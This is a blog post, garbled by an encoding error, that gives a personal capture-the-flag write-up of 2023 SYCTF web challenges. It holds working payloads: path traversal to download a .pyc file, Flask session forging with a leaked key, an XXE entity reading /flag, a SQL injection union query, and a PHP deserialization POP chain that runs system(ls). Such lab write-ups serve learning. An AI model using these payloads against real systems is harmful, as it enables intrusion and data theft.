<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[2023SYCTF&#34;å®‰æ´µæ¯&#34;]èµ›åæ€»ç»“ï¼ˆæ‘†çƒ‚ç‰ˆï¼‰ | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[2023SYCTF&#34;å®‰æ´µæ¯&#34;]èµ›åæ€»ç»“ï¼ˆæ‘†çƒ‚ç‰ˆï¼‰ | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="æœ€å¿«é€Ÿï¼Œæœ€æ–°é²œï¼Œæœ€ä¸»è§‚çš„æŒ¨æ‰“ä½“éªŒã€‚
5é“webï¼Œçœ‹äº†4é“ï¼Œç»†çœ‹3é“ï¼Œè§£å‡º1é“ï¼Œå¯ä»¥è¯´æ˜¯ç›¸å½“èœäº†ã€‚å¯æ¶å•ŠğŸ˜¡ğŸ˜¡ğŸ˜¡
CarelessPy
æ‰“å¼€ä¸»é¡µï¼Œæç¤ºäº†ä¸‰ä¸ªè·¯ç”±/evalã€/loginå’Œ/download?file=
evalé‡Œæç¤ºå¯ä»¥é€š..." />
    <meta name="keywords" content="èµ›åæ€»ç»“,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [2023SYCTF&#34;å®‰æ´µæ¯&#34;]èµ›åæ€»ç»“ï¼ˆæ‘†çƒ‚ç‰ˆï¼‰
            </h2>
            <div class="post-info">
              <span>
                2023-06-10
              </span>
              <span>
                5 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
                  # èµ›åæ€»ç»“
                </a>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-an-xun-bei-sai-hou-zong-jie-kuai-su-ban.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>æœ€å¿«é€Ÿï¼Œæœ€æ–°é²œï¼Œæœ€ä¸»è§‚çš„æŒ¨æ‰“ä½“éªŒã€‚</p>
<p>5é“webï¼Œçœ‹äº†4é“ï¼Œç»†çœ‹3é“ï¼Œè§£å‡º1é“ï¼Œå¯ä»¥è¯´æ˜¯ç›¸å½“èœäº†ã€‚å¯æ¶å•ŠğŸ˜¡ğŸ˜¡ğŸ˜¡</p>
<h1 id="carelesspy">CarelessPy</h1>
<p>æ‰“å¼€ä¸»é¡µï¼Œæç¤ºäº†ä¸‰ä¸ªè·¯ç”±<code>/eval</code>ã€<code>/login</code>å’Œ<code>/download?file=</code></p>
<p><code>eval</code>é‡Œæç¤ºå¯ä»¥é€šè¿‡<code>?cmd=</code>ä¼ å…¥å‘½ä»¤ï¼Œä½†æµ‹äº†ä¹‹ååº”è¯¥æ˜¯<code>scandir()</code>çš„å‚æ•°ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡è¿™ä¸ªæ‰¾åˆ°äº†<code>/app/__pycache__/part.cpython-311.pyc</code>ã€‚</p>
<p>ç”¨<code>/download?file=../../../app/__pycache__/part.cpython-311.pyc</code>ä¸‹è½½ï¼Œåç¼–è¯‘å¾—åˆ°<code>part.py</code>çš„æºç ï¼Œå…¶ä¸­æœ‰<code>SECRET_KEY</code>ï¼š</p>
<pre><code class="language-python">#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.11

import os
import random
import hashlib
from flask import *
from lxml import etree
app = Flask(__name__)
app.config['SECRET_KEY'] = 'o2takuXX_donot_like_ntr'
</code></pre>
<p>åœ¨<code>/login</code>é¡µé¢ç”¨å¯†é’¥è§£å¼€<code>session</code>ï¼Œé‡æ–°æ„é€ <code>{'islogin': True}</code>ç™»å½•ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1686407224689.png" alt="" loading="lazy"></p>
<p>XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼š</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;
&lt;result&gt;
&lt;ctf&gt;123123&lt;/ctf&gt;
&lt;web&gt;&amp;xxe;&lt;/web&gt;
&lt;/result&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686407457216.png" alt="" loading="lazy"></figure>
<p>æ„Ÿæƒ³ï¼šXXEç¡®å®æ²¡å¥½å¥½å­¦è¿‡ï¼Œæœ€åä¸€æ­¥å¡äº†åŠå¤©ğŸ˜¢</p>
<h1 id="confronting-robot">Confronting robot</h1>
<p>ç¬¬ä¸€ä¸ªæ³¨å…¥ç‚¹æ˜¯<code>?myname=</code>ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œä½¿ç”¨è”åˆæŸ¥è¯¢<code>sky' union select (select group_concat(username) from name)--+</code>æ‰¾åˆ°<code>/sEcR@t_n@Bodyknow.php</code><br>
<img src="https://skyblu3519.github.io/post-images/1686407820529.png" alt="" loading="lazy"></p>
<p>ç„¶åå°±å°¬ä½äº†ã€‚<code>/sEcR@t_n@Bodyknow.php</code>å¯ä»¥æ‰§è¡Œsqlè¯­å¥ï¼Œå¾—çŸ¥gameä¸ºç©ºï¼Œä»¥åŠå®ƒçš„ä¸¤ä¸ªå­—æ®µ<code>choice</code>å’Œ<code>round</code>ã€‚</p>
<p><code>game.php</code>é‡Œæœ‰è¿™ä¸ªçŒœæ‹³æœºå™¨äººçš„é€»è¾‘ï¼Œä½†æ˜¯æ•°æ®åº“ä¸ºç©ºæ‰§è¡Œä¼šæŠ¥é”™<br>
<img src="https://skyblu3519.github.io/post-images/1686410508631.png" alt="" loading="lazy"></p>
<p>è¿™é‡Œ<code>loseorwin</code>å‡½æ•°ä¸­çš„NULLå°±æ˜¯æŸ¥è¯¢çš„ç»“æœ<br>
<code>Fatal error: Uncaught TypeError: Argument 2 passed to loseorwin() must be of the type string, null given, called in /var/www/html/game.php on line 38 and defined in /var/www/html/game.php:11 Stack trace: #0 /var/www/html/game.php(38): loseorwin('S', NULL) #1 {main} thrown in /var/www/html/game.php on line 11</code></p>
<p>çŸ¥é“äº†å­—æ®µï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œsqlè¯­å¥ï¼Œæˆ‘çš„æ€è·¯å°±æ˜¯æ’å…¥æ•°æ®åˆ°gameè¡¨ä¸­ã€‚ä½†æ˜¯æƒé™ä¸å¤Ÿï¼Œæ— æ³•æ’å…¥æ•°æ®ï¼Œè¿™é¢˜æœ€ç»ˆä¹Ÿæ²¡æœ‰è§£å‡ºã€‚</p>
<p>æ„Ÿæƒ³ï¼šè§£è¿™é“é¢˜è€—å¾—æœ€ä¹…çš„ä¸€æ­¥å°±æ˜¯åœ¨ç¬¬ä¸€éƒ¨åˆ†ï¼Œå½“æ—¶ç”¨æƒ³ç€è¿™ä¹ˆç®€å•çš„æ³¨å…¥ç›´æ¥ä¸Šsqlmapï¼Œç»“æœè·‘äº†ä¸ªç©ºè¡¨å‡ºæ¥ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1686418565402.png" alt="" loading="lazy"><br>
ç„¶åå°±å°è¯•å„ç§å†™æ–‡ä»¶ï¼Œäººéƒ½éº»äº†ğŸ¤¡</p>
<h1 id="4å·çš„ç½—çº³å°”å¤š">4å·çš„ç½—çº³å°”å¤š</h1>
<pre><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
class evil{
    public $cmd;
    public $a;
    public function __destruct(){
        if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd))){
            eval($this-&gt;cmd.'givemegirlfriend!');
        } else {
            echo 'nonono';
        }
    }
}

if(!preg_match('/^[Oa]:[\d]+|Array|Iterator|Object|List/i',$_GET['Pochy'])){
    unserialize($_GET['Pochy']);
} else {
    echo 'nonono';
}
</code></pre>
<p>ç¬¬ä¸€ä¸ªæ­£åˆ™çš„ç»•è¿‡æ–¹æ³•å‚è€ƒï¼š<a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">æ„šäººæ¯3rd easy_php</a></p>
<p>ç”¨è„šæœ¬æ‰¾ä¸ªç¬¦åˆè¦æ±‚çš„ç±»ï¼š</p>
<pre><code class="language-php">$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array('unserialize',))) {
            print $class . '::' . $method . &quot;\n&quot;;
        }
    }
}
</code></pre>
<p>è¿™ä¸ªæ­£åˆ™åŒ¹é…çš„æ˜¯<code>O:</code>æˆ–<code>a:</code>å¼€å¤´æˆ–å­—ç¬¦ä¸²ä¸­é—´å‡ºç°<code>Array|Iterator|Object|List</code>çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œé€‰ç”¨SplQueueç±»ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼š</p>
<pre><code class="language-php">&lt;?php
class evil{
    public $cmd;
    public $a;

}
$a = new evil();
$queue = new SplQueue();
//echo serialize($queue);
$queue-&gt;enqueue($a);
echo serialize($queue);
</code></pre>
<p>ç°åœ¨å°±è®©evalæ‰§è¡Œå‘½ä»¤å³å¯ï¼Œ<code>if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd)))</code>è¿™ä¸ªæ¡ä»¶è®©<code>$cmd</code>ä¸­åªèƒ½å‡ºç°å¤§å°å†™å­—ç¬¦ã€å·¦å³æ‹¬å·ã€åˆ†å·å’Œä¸‹åˆ’çº¿ã€‚</p>
<p>ç›®çš„æ˜¯é¿å…<code>givemegirlfriend!</code>å¯¹<code>$cmd</code>æ‹¼æ¥å¯¼è‡´çš„evalæ— æ³•æ‰§è¡Œã€‚</p>
<p>ä½¿ç”¨<code>__halt_compiler();</code>æ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨ï¼Œå®ƒä¼šç«‹å³åœæ­¢ç¼–è¯‘å™¨çš„è§£æï¼ŒPOPé“¾æ„é€ ï¼š</p>
<pre><code class="language-php">&lt;?php
class evil{
    public $cmd='system(ls);__halt_compiler();';
    public $a;

}
$a = new evil();
$queue = new SplQueue();
//echo serialize($queue);
$queue-&gt;enqueue($a);
echo serialize($queue);
</code></pre>
<p>æœ¬åœ°æˆåŠŸäº†ä½†æ˜¯æœåŠ¡å™¨å´æ²¡ååº”ï¼Ÿï¼ï¼ï¼<br>
<img src="https://skyblu3519.github.io/post-images/1686421622958.png" alt="" loading="lazy"></p>
<p>ç„¶åæ¯”èµ›å°±ç»“æŸäº†ğŸ˜­</p>
<h1 id="task">task</h1>
<p>è¿™é¢˜ç‚¹å¼€ç®€å•çœ‹äº†ä¸‹ï¼Œä¼¼ä¹æ˜¯Goçš„ï¼Œä¸å¤ªä¼šæã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>ä½“æ„Ÿå…¶å®è¿˜è›®ä¸é”™çš„ï¼Œè€Œä¸”é˜Ÿå‹éƒ½å¾ˆç»™åŠ›ï¼ä¸‹æ¬¡å¹²å›æ¥ï¼ï¼ï¼</p>
<p>ä¹‹åç­‰wpå‡ºäº†å†æŠŠè¿™æ¬¡æ¯”èµ›çš„çŸ¥è¯†ç‚¹å¥½å¥½æ€»ç»“ä¸€ä¸‹ï¼Œå°±å…ˆè¿™æ ·å’¯ï½</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#carelesspy">CarelessPy</a></li>
<li><a href="#confronting-robot">Confronting robot</a></li>
<li><a href="#4%E5%8F%B7%E7%9A%84%E7%BD%97%E7%BA%B3%E5%B0%94%E5%A4%9A">4å·çš„ç½—çº³å°”å¤š</a></li>
<li><a href="#task">task</a></li>
<li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/yi-zhou-ctf-shua-ti-zong-jie/">
              <h3 class="post-title">
                ä¸€å‘¨CTFåˆ·é¢˜æ€»ç»“
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
